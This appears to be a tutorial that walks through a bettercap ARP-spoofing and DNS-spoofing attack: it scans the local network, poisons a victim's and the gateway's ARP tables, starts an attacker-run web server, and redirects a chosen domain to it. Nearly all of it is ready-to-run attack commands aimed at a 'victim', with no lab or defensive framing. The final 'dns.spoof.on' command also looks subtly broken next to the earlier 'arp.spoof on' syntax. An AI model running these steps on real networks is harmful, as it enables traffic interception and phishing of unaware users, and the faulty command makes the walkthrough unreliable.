
### Step 1 : Launching the Bettercap-cli

 
```bash
sudo bettercap -i <interface_name>
```

### Step 2: Listing all the devices connected to the network 


```bash
net.probe on
net.show
```

The first command will ping every IP on the network and come up with the active ones.
The second command will list the devices in a tabular format.

### Step 3: Launching the `ARP Spoofing` attack 


```bash
set arp.spoof.fullduplex true
set arp.spoof.targets <victim IP>
arp.spoof on
```

The first command will turn on the duplex mode  which will allow me to attack both the gateway and the victim(s) simultaneously.

The second command will set the target as the victim's device which will redirect  the `ARP Spoofing` attack to the victim only and will not affect other devices on the network. If the target(s) are not set, bettercap will attempt to attack the entire network.

The third option launches the attack.


### Step 4: Setting Up the Server :

Now , We will have to setup a server as the attacker to which the victim will be redirected.

```bash
sudo service apache2 start
```

The above command will start the apache2 webserver  locally on port 80.

								OR 

```bash
sudo systemctl start nginx
```

This command will start an nginx server.

Now, the attacker will have to setup a website to host on the server.
For apache :

```bash
/var/www/html
```
is the webroot.

For nginx :
```bash
/usr/share/nginx/html
```
 is the webroot.



### Step 5: Poisoning the DNS cache of the target :

The main goal here is to poison the DNS cache stored in the target's system and to map the domains of legitimate website to the attacker's IP address within the DNS cache. Now when the target's machine will try to query a website and if the website is already in the DNS cache, it will pickup the attacker's IP from the cache and make the request to the attacker controlled server.

```bash
help dns.spoof
```

This will open the help menu of the `dns.spoof` module 

```bash
set dns.spoof.domain <any-domain>
```

This will set the domain to be spoofed. if the victim visits the domain specified here, they will be redirected to the attacker's server.

```bash
set dns.spoof.address <attacker controlled server IP>
```

This will specify the IP address of the attacker controlled server to which the victim will be redirected 

```bash
dns.spoof.on
```

This will launch the `DNS Spoof Attack`

Now, when the victim visits the targeted domain in their browser, they will be redirected to the attacker's controlled server. 